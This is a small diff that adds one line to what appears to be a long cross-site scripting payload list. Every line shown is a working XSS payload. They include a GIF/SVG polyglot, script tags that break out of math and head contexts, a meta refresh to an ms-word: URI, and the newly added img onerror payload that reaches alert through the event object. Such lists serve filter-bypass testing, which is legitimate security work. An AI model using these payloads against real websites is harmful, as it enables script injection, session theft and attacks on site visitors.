@@ -1719,3 +1719,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <math><script>//<head><script>alert(1)</script>
 <meta http-equiv="refresh" content="0;url=ms-word:ofe|u|\\SITE/word.docx"/>
 <math><annotation-xml><textarea/><svg><script>alert(1)</script>
+<img onerror=event.path.pop().alert(1) src>
